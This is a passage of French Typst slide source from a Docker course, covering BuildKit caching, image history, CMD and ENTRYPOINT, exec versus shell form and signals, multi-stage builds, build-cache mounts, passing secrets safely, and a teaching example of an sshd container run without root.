refaite entraîne les suivantes (leur parent a changé). \#N : BuildKit numérote chaque opération du build dans l’ordre où il l’affiche, en --progress\=plain sur le même Dockerfile : \#1 load build definition, \#2 load metadata (nginx), \#3 load.dockerignore, \#4 load build context, \#5 \[1/2\] FROM, \#6 \[2/2\] COPY, \#7 exporting to image. Le numéro est le même d’un build à l’autre tant que le Dockerfile ne change pas ; il ne correspond pas à la ligne du Dockerfile, contrairement à \[2/2\] (étape 2 sur 2 : FROM puis COPY ; EXPOSE et HEALTHCHECK ne modifient que la configuration et ne sont pas comptés). Conséquence pratique (bonnes pratiques) : apt-get update et apt-get install dans le même RUN, et reconstruire régulièrement avec un cache vierge (--no-cache --pull, diapositive 85) : sinon les paquets restent ceux du jour où la couche a été mise en cache, avec leurs failles de sécurité connues depuis et non corrigées.]
#anime(
  rang(
    bloc(role: "retenir")[Clé de l'étape COPY][
      - *clé* = empreinte de : la clé du parent + l'instruction + `hello.conf` (contenu, permissions)
      - Même clé → couche réutilisée (`CACHED`) ; un seul octet change → clé différente, étape ré-exécutée
    ],
    bloc(role: "pratique")[Terminal][
      #terminal(taille: px(15))[
  ```
  # 1er build
  $ docker image build -t hello . 2>&1 | grep -A1 COPY
  #6 [2/2] COPY hello.conf …default.conf
  #6 DONE 0.1s
  # 2e build : rien n'a changé
  $ docker image build -t hello . 2>&1 | grep COPY
  #6 CACHED
  ```
      ]
    ],
  ),
  note(role: "precaution")[Sortie redirigée vers `grep`, donc pas un terminal : BuildKit écrit en mode `plain`. `#N` = numéro d'opération (`#1`–`#4` préparation, `#5` FROM, `#7` export).],
  note: _note,
)

== docker image history : à votre avis ?
#let _note = [Question du cours d’origine (« Pourquoi y a-t-il une différence de 3 jours ? »), sur l’image hello du fil rouge. Sortie réelle (docker.io 26.1.5 de Debian 13). Laisser chercher.]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.5)[Terminal][
      #terminal(taille: px(13))[
  ```
  $ docker image history hello | head -6
  IMAGE          CREATED      CREATED BY            SIZE  COMMENT
  eef28634a880   3 min ago    HEALTHCHECK …wget…   0B    buildkit…
  <missing>      3 min ago    EXPOSE map[80/tcp…   0B    buildkit…
  <missing>      3 min ago    COPY hello.conf …    127B  buildkit…
  <missing>      7 months ago RUN /bin/sh -c set…  49.4MB buildkit…
  <missing>      7 months ago ENV ACME_VERSION…    0B    buildkit…
  ```
      ]
    ],
    bloc(role: "question")[À vous][
      + Deux dates : il y a 3 min *et* il y a 7 mois ?
      + Que signifie `<missing>` ?
      + Pourquoi tant de lignes à 0 B ?
    ],
  ),
  note: _note,
)

== docker image history : réponses
#let _note = [Deux clics par question : d’abord la question, puis la réponse avec en même temps les cases du terminal qui la justifient (cadre orange) : 1 la colonne CREATED, 2 les \<missing\> de la colonne IMAGE, 3 les 0B de la colonne SIZE. Sortie réelle (docker.io 26.1.5 de Debian 13, BuildKit via docker-buildx). Avec l’ancien builder, chaque étape produisait une image intermédiaire : seules les étapes de l’image de base téléchargée affichaient \<missing\>.]

#corriges(note: _note,
  (1, [Pourquoi deux dates : il y a 3 min *et* il y a 7 mois ?],
     reponse[Les couches de `nginx` ont été construites par ses mainteneurs (7 mois), téléchargées telles quelles ; seules nos étapes (COPY, EXPOSE, HEALTHCHECK) ont été construites ici.]),
  (2, [Que signifie `<missing>` ?],
     reponse[Une couche réutilisée garde sa date ; cette étape n'a pas d'*identifiant d'image* sur votre machine. Seule la dernière ligne (`hello`) en a un.]),
  (3, [Pourquoi tant de lignes à 0 B ?],
     reponse[Instruction qui ne modifie que les métadonnées (ENV, EXPOSE, CMD, HEALTHCHECK…) → couche vide.]),
)


== Après deux builds : à votre avis ?
#let _note = [Sorties réelles, docker.io 26.1.5 de Debian 13 (BuildKit, pilote overlay2), démon ne contenant que nginx:1.29-alpine au départ. Les deux builds : docker image build -q -t hello. avant et après avoir remplacé « Bonjour » par « Salut » dans hello.conf. Avec le builder classique, docker image ls -a aurait listé une image \<none\> par étape. Laisser chercher.]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.6)[Terminal · `hello` reconstruite après édition de `hello.conf`][
      #terminal(taille: px(12))[
  ```
  $ docker image ls -a
  REPOSITORY  TAG           IMAGE ID       CREATED   SIZE
  hello       latest        43086c8eea11   5 s ago   62.2MB
  <none>      <none>        55551eeaca14   25 s ago  62.2MB
  nginx       1.29-alpine   812d47f806db   7 mo ago  62.2MB
  $ docker system df
  TYPE          TOTAL  ACTIVE  SIZE      RECLAIMABLE
  Images        3      0       62.18MB   62.18MB (100%)
  Build Cache   13     0       273B      273B
  ```
      ]
    ],
    bloc(role: "question")[À vous][
      + Deux builds, aucune image intermédiaire : où sont les étapes ?
      + D'où vient l'image `<none>` ?
      + Les 13 « Build Cache » ?
      + Que libèrent `image prune` et `builder prune` ?
    ],
  ),
  note: _note,
)

== Après deux builds : réponses
#let _note = [Deux clics par question : d’abord la question, puis la réponse avec en même temps les lignes du terminal qui la justifient (cadre orange) : 1 la liste des images (aucune image intermédiaire) et des conteneurs (aucun) ; 2 l’image \<none\> ; 3 la ligne Build Cache ; 4 les deux prune, puis leurs bilans. Suite directe de la diapositive précédente, sorties réelles (docker.io 26.1.5). Lecture des 0B de image prune : la couche COPY de l’ancienne image (127B) figure encore dans le cache de build (entrée pqc4dq…, 127B, listée par builder prune) ; c’est builder prune qui la libère. Le cache de build se vide aussi tout seul selon une politique de rétention (garbage collection de BuildKit). Avec le builder classique, docker image rm supprimait en cascade les images intermédiaires devenues inutiles.]

#corriges(note: _note,
  (1, [Où sont passées les étapes ?],
     reponse[Dans le *cache de build*, sous leur clé : BuildKit n'écrit que l'image finale.]),
  (2, [D'où vient l'image `<none>` ?],
     reponse[L'ancienne `hello` : son tag est passé à la nouvelle, elle est *pendante* (_dangling_).]),
  (3, [Que représentent les 13 « Build Cache » ?],
     reponse[Les étapes et fichiers gardés par BuildKit (détail : `docker buildx du`).]),
  (4, [Que libèrent `image prune` et `builder prune` ?],
     reponse[`image prune` : les images pendantes (0 B ici, la couche reste dans le cache). `builder prune` : le cache inutilisé (400 B).]),
)


== Dockerfile : bonnes pratiques
#let _note = [Cache vierge : docker image build --no-cache --pull -t hello. (options d’après docker.io 26.1.5). --no-cache réexécute toutes les étapes, donc apt-get update télécharge des index à jour ; --pull retélécharge aussi l’image de base (FROM), qui sinon reste celle déjà présente localement. Avec un FROM épinglé par digest, --pull ne change rien : c’est voulu (build reproductible) ; mettre à jour le digest est alors une décision explicite.]
#anime(
  rang(
    bloc[Encore quelques informations][
      - Taguer et versionner ses images de production
      - Build reproductible : figer la base, `FROM debian@sha256:…`
      - Instructions stables d'abord (souvent les plus lourdes : paquets), changeantes en dernier
      - `apt update` et `apt install` dans le *même* `RUN`
      - Reconstruire régulièrement à cache vierge (`--no-cache --pull`) : sinon l'`apt update` en cache n'est jamais relancé
    ],
    bloc(role: "precaution")[`RUN cd` est sans effet sur l'instruction suivante][
      #terminal(titre: none, taille: px(16))[```
  RUN cd /tmp
  RUN pwd      # affiche / : chaque RUN
               # repart de zéro
  WORKDIR /tmp # la bonne façon
  ```]
    ],
  ),
  note: _note,
)

== Dockerfile : à vous
#let _note = none
#anime(
  rang(
    bloc(role: "question")[À vous][
      + Rédigez un Dockerfile : image « mon_image » à partir d'une `debian:13`
      + Elle contiendra le paquet `inetutils-ping`
      + Commande par défaut : `ping localhost` (instruction `CMD`)
      + Testez en instanciant un conteneur
      + Surchargez la commande par défaut : `ping qwant.com`
    ],
  ),
  note: _note,
)

== Différence entre CMD et ENTRYPOINT
#let _note = [DEBIAN\_FRONTEND\=noninteractive placé devant apt install : une variable en préfixe ne vaut que pour la commande qui la suit, pas pour celles après &&. Laisser chercher : réponses sur la diapositive suivante.]

#anime(
  rang(
    bloc[Dockerfile][
      #terminal(titre: none, taille: px(15))[```
FROM debian:13
RUN apt update && \
  DEBIAN_FRONTEND=noninteractive \
  apt install -yq inetutils-ping && \
  rm -rf /var/lib/apt/lists/*
ENTRYPOINT ["ping", "-c", "2"]
CMD ["localhost"]
```]
    ],
    bloc(role: "question")[À vous][
      + Construisez : `docker image build . -t ping`
      + Sans argument : `docker container run ping`
      + Avec un argument : `docker container run ping qwant.com`
      + Que fait chaque instruction ? Qu'est-ce qui a été remplacé ?
    ],
  ),
  note: _note,
)


== CMD et ENTRYPOINT : corrigé (1/2)
#let _note = [Deux clics par question : l’énoncé, puis la commande et sa sortie réelle. Build sur docker.io 26.1.5 de Debian 13 avec -q, qui n’affiche que l’identifiant de l’image (sha256:23b0c0206d13…) ; la sortie BuildKit complète est détaillée dans la partie BuildKit. Sans argument, CMD fournit localhost : le conteneur exécute ping -c 2 localhost. Avec qwant.com, l’argument remplace CMD : ping -c 2 qwant.com (sortie abrégée : la résolution et les temps dépendent du réseau).]

#corriges(note: _note,
  (2, [Instanciez sans argument : `docker container run ping`],
     reponse(terminal(taille: px(13))[```
$ docker container run ping        # ping -c 2 localhost
PING localhost (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.055 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.054 ms
--- localhost ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
```])),
  (3, [Puis avec un argument : `docker container run ping qwant.com`],
     reponse(terminal(taille: px(13))[```
$ docker container run ping qwant.com   # ping -c 2 qwant.com
PING qwant.com (…): 56 data bytes
# … 2 réponses, puis les statistiques
```])),
)


== CMD et ENTRYPOINT : corrigé (2/2)
#let _note = [Clic 1 : l’énoncé ; clic 2 : ce que fait chaque instruction et ce qui a été remplacé (CMD par l’argument, pas les paramètres d’ENTRYPOINT) ; clic 3 : --entrypoint, qui remplace ENTRYPOINT au lancement (sortie réelle : /etc/debian\_version de l’image) ; clic 4 : forme exec et forme shell.]

#slide(repeat: 2, self => {
  let (uncover,) = utils.methods(self)
  corrige(4, [Que fait chaque instruction ? Qu'est-ce qui a été remplacé ?],
    uncover("2-", reponse[
      - `ENTRYPOINT` : le conteneur s'utilise comme un *exécutable*
      - `CMD` : paramètres par défaut, remplacés par les arguments de `run`
      - Les paramètres d'`ENTRYPOINT` (`-c 2`) ne sont *pas* remplacés
      - `--entrypoint` remplace `ENTRYPOINT` au lancement
    ]))
  v(px(16))
  uncover("2-", note(role: "precaution")[Forme *exec* `["ping","-c","2"]` (ici) : sans shell. Forme *shell* (`ping -c 2`) : passe par `/bin/sh -c`, qui interprète `${VAR}`, `&&`, `|`… (deux diapositives suivantes). #linebreak() `$ docker container run --entrypoint cat ping /etc/debian_version` → `13.7`])
  if _note != none { utils.speaker-note(self: self, _note) }
})


== Forme exec ou shell (1/2) : variables, arguments
#let _note = [Sorties réelles, docker.io 26.1.5 de Debian 13, deux images construites depuis debian:13 (forme-exec, forme-shell). Un clic par ligne : 1 docker image inspect montre l’ENTRYPOINT enregistré ; 2 lancement simple ; 3 lancement avec des arguments. À noter : avec ENTRYPOINT echo bonjour (forme shell) et CMD \["au", "revoir"\], le conteneur affiche seulement bonjour : CMD est ignoré. Les arguments passés à sh -c après la commande deviennent \$0, \$1… du shell, que la commande n’utilise pas.]
#anime(
  rang(
    bloc[Forme exec `["…", "…"]`][
      #terminal(titre: none, taille: px(14))[```
  FROM debian:13
  ENTRYPOINT ["echo", "HOME=$HOME", "bonjour"]
  ```]
      #terminal(taille: px(12))[```
  $ run --rm forme-exec
  HOME=$HOME bonjour
  $ run --rm forme-exec au revoir
  HOME=$HOME bonjour au revoir
  ```]
    ],
    bloc[Forme shell : texte libre][
      #terminal(titre: none, taille: px(14))[```
  FROM debian:13
  ENTRYPOINT echo HOME=$HOME bonjour
  ```]
      #terminal(taille: px(12))[```
  $ run --rm forme-shell
  HOME=/root bonjour
  $ run --rm forme-shell au revoir
  HOME=/root bonjour
  ```]
    ],
  ),
  note(role: "retenir")[*1.* La forme shell est enveloppée dans `/bin/sh -c "…"` : c'est `sh` qui est lancé. *2.* Seul un shell remplace `$HOME` : la forme exec transmet le texte tel quel. *3.* Exec : les arguments de `run` s'ajoutent ; shell : ils sont ignorés, `CMD` aussi.],
  note: _note,
)

== Forme exec ou shell (2/2) : PID 1 et signaux
#let _note = [Sorties réelles, docker.io 26.1.5 de Debian 13 (images sig-exec et sig-shell). Le programme est le même ; seule la forme change. En forme shell, Docker lance /bin/sh -c "bash -c …" : sh (dash sous Debian) reste PID 1 et attend son fils, il ne le remplace pas (pas d’exec). Un PID 1 sans gestionnaire ignore SIGTERM (le noyau protège le PID 1 de son espace de noms) : docker container stop attend 10 s puis envoie SIGKILL (code 137). Même mécanisme que la diapositive sur --init. Dans un \["sh", "-c", "…"\], terminer par exec programme remplace le shell par le programme, qui devient PID 1.]
#anime(
  rang(
    bloc[Forme exec → PID 1 = bash][
      #terminal(taille: px(12))[```
  $ docker container top exec -o pid,comm
  PID    COMMAND
  2270   bash
  2291   sleep
  $ time docker container stop exec
  real 0m0.085s
  $ docker container logs exec
  SIGTERM recu
  $ inspect -f '{{.State.ExitCode}}' exec
  0
  ```]
    ],
    bloc(role: "avertissement")[Forme shell → PID 1 = sh][
      #terminal(taille: px(12))[```
  $ docker container top shell -o pid,comm
  PID    COMMAND
  2395   sh
  2418   bash
  2419   sleep
  $ time docker container stop shell
  real 0m10.120s
  $ inspect -f '{{.State.ExitCode}}' shell
  137
  ```]
    ],
  ),
  note(role: "retenir")[`stop` envoie SIGTERM au PID 1. *Exec* : bash a un `trap`, arrêt en 0,09 s, code 0. *Shell* : `sh` (PID 1) ignore SIGTERM et ne le relaie pas → 10 s puis SIGKILL, code 137 = 128 + 9. Préférer la forme exec ; un shell s'il le faut : `["sh","-c","… exec programme"]`.],
  note: _note,
)

== --init : quand l’utiliser ?
#let _note = [Diapositive placée après « CMD et ENTRYPOINT » : formes shell et exec, ENTRYPOINT et Compose sont connus. Elle prolonge la diapositive « --init » des Bases. Sur docker.io 26.1.5 de Debian 13. Avec --init, /proc/1/cmdline vaut « /sbin/docker-init -- … » (tini du paquet Debian). Zombies : bash -c '(sleep 1 &); exec sleep 300' laisse sans --init un \[sleep\] \<defunct\> enfant du PID 1 ; avec --init, tini le récolte (docker container top ne montre pas les zombies : ps --ppid sur l’hôte). Forme shell : docker container run debian sh -c 'sleep 300' donne un PID 1 sh avec sleep en enfant ; docker container stop prend 10 s, code 137. Le noyau ne délivre au PID 1 d’un espace de noms que les signaux pour lesquels il a un gestionnaire (sauf SIGKILL et SIGSTOP envoyés depuis l’espace parent). Documentation Docker (consultée le 16/11/2026) : docs.docker.com/build/building/best-practices/ : « CMD should almost always be used in the form of CMD \["executable", "param1", "param2"\] » ; script d’entrée terminé par exec « so that the final running application becomes the container's PID 1 \[…\] This allows the application to receive any Unix signals sent to the container » ; « Limiting each container to one process is a good rule of thumb, but it's not a hard and fast rule ». Pour tout l’hôte : "init": true dans /etc/docker/daemon.json. docs.docker.com/engine/containers/multi-service\_container/ : « If your process falls into this category, you can use the --init option » (processus principal qui ne récolte pas ses enfants) ; --init « inserts a tiny init-process into the container as the main process ».]
#anime(
  rang(
    bloc(role: "pratique")[Le mettre][
      - Programme qui ne gère pas SIGTERM : script shell, `sleep`…
      - Sous-processus orphelins : scripts, tests, navigateur sans tête
      - `CMD` en forme shell : PID 1 = `sh`, qui ne relaie pas SIGTERM
    ],
    bloc(role: "precaution")[Inutile][
      - L'image a déjà son init en `ENTRYPOINT` (tini, dumb-init, s6-overlay)
      - Serveur qui gère ses signaux et ses enfants : nginx, PostgreSQL…
    ],
  ),
  note(role: "retenir")[Recommandation officielle : *1.* forme exec `["…"]` pour `CMD`/`ENTRYPOINT` (l'appli est PID 1 et reçoit les signaux) ; *2.* script d'entrée : finir par `exec "$@"` ; *3.* sinon `--init` (Compose : `init: true` ; hôte : `daemon.json`).],
  note: _note,
)

== Build multi-stage
#let _note = [Construit et mesuré (docker.io 26.1.5 de Debian 13) : hello-static 758 448 octets, debian:13 120 151 922 octets (docker image inspect -f {{.Size}}).]
#anime(
  rang(
    bloc[Dockerfile][
      #terminal(titre: none, taille: px(14))[```
  FROM debian:13 AS builder
  WORKDIR /src
  COPY hello.c .
  RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive \
    apt-get install -yq gcc libc6-dev && \
    gcc -static -O2 -o hello hello.c
  
  FROM scratch
  COPY --from=builder /src/hello /hello
  ENTRYPOINT ["/hello"]
  ```]
    ],
    bloc(role: "retenir")[À retenir][
      - Plusieurs `FROM` : seule la *dernière* étape produit l'image
      - `COPY --from` récupère un fichier d'une étape précédente
      - `FROM scratch` : l'image vide → *758 ko* contre 120 Mo pour `debian:13`
      - `--target builder` : s'arrêter à la compilation (diapositive suivante)
      - Moins d'outils dans l'image : moins de surface d'attaque
    ],
  ),
  note: _note,
)

== Multi-stage : --target pour s’arrêter à une étape
#let _note = [Sur docker.io 26.1.5 (BuildKit), Dockerfile de la diapositive précédente : hello-dev 361 353 488 octets (dont 184 Ko de certificats ajoutés pour l’accès apt du bac à sable, sans effet sur l’arrondi 361MB), hello-static 758 448 octets. Sans --target, BuildKit ne construit que les étapes nécessaires à la dernière ; avec --target builder, l’étape scratch n’est pas construite.]
#anime(
  rang(
    bloc(role: "pratique", poids: 1.4)[Terminal][
      #terminal(taille: px(13))[
  ```
  $ docker image build -t hello-dev --target builder .
  $ docker image build -t hello-static .
  $ docker image ls --filter reference='hello-*' \
      --format 'table {{.Repository}}\t{{.Size}}'
  REPOSITORY     SIZE
  hello-static   758kB
  hello-dev      361MB
  $ docker container run --rm hello-dev ls /src
  hello  hello.c
  ```
      ]
    ],
    bloc[À quoi sert `--target`][
      - Construire jusqu'à une étape nommée (`AS builder`) au lieu de la dernière
      - Son image garde compilateur et sources : *361 Mo* contre 758 ko
      - Déboguer : `docker container run -it --rm hello-dev bash`
      - Un seul Dockerfile → une étape de test (CI), une image de dev outillée, une image de prod minimale
    ],
  ),
  note: _note,
)

== BuildKit : étapes en parallèle, étapes sautées
#let _note = [Animation automatique à l’arrivée, fidèle à l’enregistrement brut du terminal (61 états dessinés par BuildKit en 4 s ; 8 sont montrés, à peu près au même rythme) : la ligne \[+\] Building seule, puis les étapes internes, puis les deux RUN qui démarrent ensemble et dont les chronos avancent en même temps (doc et outils, 0,2 s, 0,6 s… 3,5 s), enfin l’état final. Les cases outils et doc (et « en parallèle ») apparaissent avec les deux lignes RUN. Ensuite, clic 1 : tests n’est pas construite, car l’image finale ne copie rien depuis elle ; clic 2 : la ligne des temps de build. Sorties réelles, docker.io 26.1.5 de Debian 13, cache vidé (docker builder prune -af), terminal de 80 colonnes : build de 3,9 s, deux RUN de 3,7 s chacun. Comparaison : time DOCKER\_BUILDKIT\=0 docker image build -q -t para-legacy. → real 0m9.812s, et docker image ls -a montre 4 images \<none\> supplémentaires (une par RUN, tests comprise). docker container run --rm para ls / liste doc.txt et outils.txt.]
#anime(
  rang(
    bloc[Dockerfile — 3 étapes indépendantes][
      #terminal(titre: none, taille: px(13))[```
  FROM debian:13 AS outils
  RUN sleep 3 && echo outils > /outils.txt
  FROM debian:13 AS doc
  RUN sleep 3 && echo doc > /doc.txt
  FROM debian:13 AS tests
  RUN sleep 3 && echo tests > /tests.txt
  FROM debian:13          # image finale
  COPY --from=outils /outils.txt /
  COPY --from=doc /doc.txt /
  ```]
    ],
    bloc(role: "pratique")[Terminal][
      #terminal(taille: px(12))[
  ```
  $ docker image build -t para .
  [+] Building 3.9s (9/9) FINISHED
   => [doc 2/2]    RUN sleep 3 …         3.7s
   => [outils 2/2] RUN sleep 3 …         3.7s
   => [stage-3] COPY --from=outils …     0.0s
   => [stage-3] COPY --from=doc …        0.0s
  ```
      ]
    ],
  ),
  note(role: "retenir")[`tests` est *sautée* : rien n'en dépend. `outils` et `doc` ne dépendent pas l'une de l'autre → en *parallèle* : 3,9 s au total pour deux `RUN` de 3,7 s. L'ancien builder, même Dockerfile : 9,8 s, `tests` comprise.],
  note: _note,
)

== BuildKit : montages et multi-architecture
#let _note = [docker.io 26.1.5 de Debian 13 (pilote overlay2) : avec le builder par défaut, « ERROR: Multi-platform build is not supported for the docker driver. Switch to a different driver, or turn on the containerd image store ». D’où docker buildx create (builder dans un conteneur moby/buildkit). Pour exécuter des étapes RUN d’une autre architecture : émulation QEMU (paquet qemu-user-binfmt). La construction multi-plateforme elle-même n’a pas pu être rejouée ici (pas d’accès direct au registre depuis le builder).]
#anime(
  rang(
    bloc[Montages le temps d'un `RUN`][
      #terminal(titre: none, taille: px(15))[```
  # cache persistant
  RUN --mount=type=cache,target=/var/cache/apt …
  # secret éphémère
  RUN --mount=type=secret,id=db_pass …
  ```]
      - Cache persistant, secret éphémère (diapositives suivantes)
      - Secrets de build absents de l'image et de son historique
    ],
    bloc(role: "pratique")[Multi-architecture avec `buildx`][
      #terminal(taille: px(14))[```
  $ docker buildx create --use --name multi
  $ docker buildx build \
      --platform linux/amd64,linux/arm64 \
      -t monimage:1.0 --push .
  ```]
    ],
  ),
  note: _note,
)

== BuildKit : un cache qui survit aux builds
#let _note = [Sur docker.io 26.1.5 (BuildKit) après docker builder prune -af : 1er build « Need to get 4909 kB of archives. », puis avec « curl wget » : « Need to get 984 kB/5894 kB of archives. » (seul wget). La sortie complète de --progress\=plain fait 183 lignes au 1er build (162 au 2e), d’où le grep, qui rend le filtre visible : ce qui s’affiche est la sortie complète de la commande, préfixe compris. Avec --no-cache, les deux builds téléchargent 4909 kB : le cache de montage n’est pas réutilisé. Le fichier /etc/apt/apt.conf.d/docker-clean de l’image debian vide /var/cache/apt/archives après chaque installation.]
#anime(
  rang(
    bloc[Dockerfile][
      #terminal(titre: none, taille: px(12))[```
  FROM debian:13
  # Debian vide le cache apt : on l'en empêche
  RUN rm -f /etc/apt/apt.conf.d/docker-clean
  RUN --mount=type=cache,target=/var/cache/apt,sharing=locked \
      --mount=type=cache,target=/var/lib/apt,sharing=locked \
      apt-get update && \
      apt-get install -y --no-install-recommends curl
  ```]
    ],
    bloc(role: "pratique")[Terminal][
      #terminal(taille: px(12))[```
  # 1er build
  … | grep 'Need to get'
  #6 3.114 Need to get 4909 kB of archives.
  # on ajoute wget, 2e build
  #6 1.708 Need to get 984 kB/5894 kB …
  # seul wget (984 kB) est téléchargé
  $ run --rm outils ls /var/cache/apt/archives
  ls: cannot access …: No such file or directory
  ```]
    ],
  ),
  note(role: "retenir")[Le répertoire monté est *conservé par BuildKit* d'un build à l'autre, mais *n'entre pas dans l'image*. Avec `--no-cache`, il n'est pas réutilisé. `--progress=plain` affiche la sortie des `RUN` ; `#6` = 6#super[e] opération, `3.114` = secondes depuis son début.],
  note: _note,
)

== BuildKit : un secret passé par ARG fuit
#let _note = [Sortie complète réelle (docker.io 26.1.5, BuildKit, terminal de 80 colonnes). Le mot de passe apparaît deux fois : dans la sortie du build (le RUN y est affiché avec la valeur substituée) et dans docker image history. Il n’est pas dans docker image inspect : c’est l’historique qui fuit. Diapositive suivante : la bonne méthode.]
#anime(
  rang(
    bloc(role: "avertissement")[À éviter : `ARG`][
      #terminal(titre: none, taille: px(15))[```
  FROM debian:13
  ARG DB_PASS
  RUN echo "connexion avec $DB_PASS" >/dev/null
  ```]
      - La valeur s'affiche dans la sortie du build
      - Elle reste dans `docker image history` : quiconque a l'image la lit
    ],
    bloc(role: "danger")[Terminal][
      #terminal(taille: px(12))[```
  $ docker image build -t secret-bad \
      --build-arg DB_PASS=S3cr3t! .
   => [2/2] RUN echo "connexion avec S3cr3t!" …
  $ docker image history --no-trunc \
      --format '{{.CreatedBy}}' secret-bad | head -1
  RUN |1 DB_PASS=S3cr3t! /bin/sh -c echo …
  ```]
    ],
  ),
  note: _note,
)

== BuildKit : un secret qui ne laisse pas de trace
#let _note = [Clic 1 : d’où vient le secret, un fichier de l’hôte (db\_pass.txt, « S3cr3t! », 8 octets avec le saut de ligne). Clic 2 : build réel (docker.io 26.1.5, BuildKit) ; --secret id\=db\_pass,src\=db\_pass.txt le monte en /run/secrets/db\_pass pendant le seul RUN qui le demande. La ligne verte « \#5 0.124 8 /run/secrets/db\_pass » est la sortie de wc -c : \#5 \= 5e opération du build, 0.124 \= secondes depuis son début, 8 \= octets lus. Le RUN a donc bien lu le secret sans l’afficher (wc -c plutôt que cat : la sortie du build est journalisée). Sans --progress\=plain, cette sortie serait masquée. \#4 CACHED : debian:13 déjà utilisée. Clic 3 : l’historique ne garde que la commande, pas la valeur. À noter : docker container run --rm secret-good ls /run/secrets → « ls: cannot access '/run/secrets': No such file or directory ».]
#anime(
  rang(
    bloc(role: "pratique")[Dockerfile + build][
      #terminal(titre: none, taille: px(13))[```
  FROM debian:13
  RUN --mount=type=secret,id=db_pass \
      wc -c /run/secrets/db_pass
  ```]
      #terminal(taille: px(12))[```
  $ cat db_pass.txt
  S3cr3t!
  $ docker image build --progress=plain -t secret-good \
      --secret id=db_pass,src=db_pass.txt .
  #5 … RUN --mount=type=secret,id=db_pass wc -c …
  #5 0.124 8 /run/secrets/db_pass
  ```]
    ],
    bloc(role: "retenir")[À retenir][
      - `--secret` monte `db_pass.txt` en `/run/secrets/db_pass` le temps du `RUN`
      - `wc -c` lit *8* octets (`S3cr3t!` + saut de ligne) sans afficher le secret
      - Ni dans l'image, ni dans l'historique :
      #terminal(titre: none, taille: px(12))[```
  history --no-trunc … secret-good | head -1
  RUN /bin/sh -c wc -c /run/secrets/db_pass
  ```]
    ],
  ),
  note: _note,
)

== Étude de cas : un serveur ssh sans root
#let _note = [Construit (docker.io 26.1.5 de Debian 13) avec debian:13 (OpenSSH 10.0) : connexion par clé acceptée ; le processus d’écoute sshd et les deux processus sshd-session tournent sous lambda. docker image build -t sshd. (cle.pub dans le contexte) ; docker container run -d -p 2222:2222 sshd ; ssh -p 2222 -i cle lambda\@localhost. Cet exemple sert à étudier la construction d’une image et la question de root ; la règle 5.7 du CIS Docker Benchmark (« Ensure sshd is not run within containers ») demande de passer par l’hôte et docker exec. CIS : Center for Internet Security, organisme indépendant à but non lucratif ; ses « CIS Benchmarks » sont des guides de durcissement rédigés par consensus d’experts, un par produit (https://www.cisecurity.org/benchmark/docker). Numéros de règles des versions 1.5 à 1.8 du CIS Docker Benchmark (d’après les fiches d’audit Tenable) ; la dernière version publiée est la 1.9, dont le texte complet est réservé aux inscrits.]
#anime(
  rang(
    bloc[Dockerfile][
      #terminal(titre: none, taille: px(12))[```
  FROM debian:13
  RUN apt update && DEBIAN_FRONTEND=noninteractive \
    apt install -yq openssh-server && \
    rm -rf /var/lib/apt/lists/*
  RUN useradd lambda --create-home --shell /bin/bash
  USER lambda
  WORKDIR /home/lambda
  RUN mkdir -p .ssh ssh && \
    ssh-keygen -q -t ed25519 -N "" -f ssh/hostkey
  COPY --chown=lambda cle.pub .ssh/authorized_keys
  EXPOSE 2222
  CMD ["/usr/sbin/sshd","-D","-e","-p","2222", \
    "-h","/home/lambda/ssh/hostkey", \
    "-o","UsePAM=no","-o","PidFile=none"]
  ```]
    ],
    bloc(role: "precaution")[Exemple d'école][
      En production, *pas de `sshd` dans un conteneur* : règle 5.7 du *CIS Docker Benchmark*, guide de durcissement du Center for Internet Security (organisme à but non lucratif).
  
      Accès : `ssh` vers l'hôte, puis `docker container exec`.
    ],
  ),
  source-de: [#link("https://www.cisecurity.org/benchmark/docker")[CIS Docker Benchmark — règle 5.7]],
  note: _note,
)

== Du Dockerfile à l’image : une couche par instruction
#let _note = [Repris du cours d’origine (« Dockerfile serveur ssh : explication graphique ») sur le Dockerfile de l’étude de cas, un clic par instruction, chaque couche empilée à sa place. Chaque instruction produit une ligne dans docker image history : RUN exécute la commande dans un conteneur temporaire (colonne de droite), garde le diff comme couche, puis supprime le conteneur ; COPY et FROM écrivent une couche directement ; USER, WORKDIR, EXPOSE et CMD sont des métadonnées, affichées 0 B. Sur docker.io 26.1.5 (BuildKit) : docker image history d’une image de cette forme montre une ligne par instruction, avec 0 B pour USER, WORKDIR, EXPOSE et CMD, et une taille non nulle pour FROM (120 MB), les RUN et le COPY. Pendant un RUN, ps --forest montre dockerd → runc, et docker container ls -a ne montre aucun conteneur (il est jetable). Nuance : WORKDIR apparaît aussi à 0 B ici ; il peut créer un répertoire, mais s’il existe déjà la couche est vide.]
#anime(
  rang(
    bloc[Dockerfile — 9 instructions][
      #terminal(titre: none, taille: px(13))[```
  FROM debian:13
  RUN apt … install -yq openssh-server …
  RUN useradd lambda --create-home …
  USER lambda
  WORKDIR /home/lambda
  RUN mkdir -p .ssh ssh && ssh-keygen … hostkey
  COPY --chown=lambda cle.pub .ssh/authorized_keys
  EXPOSE 2222
  CMD ["/usr/sbin/sshd", "-D", "-e", …]
  ```]
    ],
    bloc(role: "retenir")[Une couche par instruction][
      - `FROM` `debian:13` : 120 Mo
      - 3 × `RUN` : openssh, useradd, ssh-keygen → une couche chacun
      - `COPY cle.pub` : une couche
      - `USER`, `WORKDIR`, `EXPOSE`, `CMD` : *0 B* (que de la configuration)
    ],
  ),
  note(role: "retenir")[9 instructions → 9 lignes dans `docker image history`. `RUN` passe par un *conteneur jetable* (démarré, puis _commit_, puis supprimé) ; `COPY` et `FROM` écrivent directement une couche.],
  note: _note,
)

== sshd sans root : ce que ça coûte
#let _note = [Sorties réelles (docker.io 26.1.5 de Debian 13, debian:13). Mot de passe refusé : « Could not get shadow information for lambda » dans docker container logs. CIS : Center for Internet Security, organisme indépendant à but non lucratif ; ses « CIS Benchmarks » sont des guides de durcissement rédigés par consensus d’experts, un par produit (https://www.cisecurity.org/benchmark/docker). Numéros de règles des versions 1.5 à 1.8 du CIS Docker Benchmark (d’après les fiches d’audit Tenable) ; la dernière version publiée est la 1.9, dont le texte complet est réservé aux inscrits.]
#anime(
  rang(
    bloc(role: "precaution")[Limites de `sshd` lancé par `lambda`][
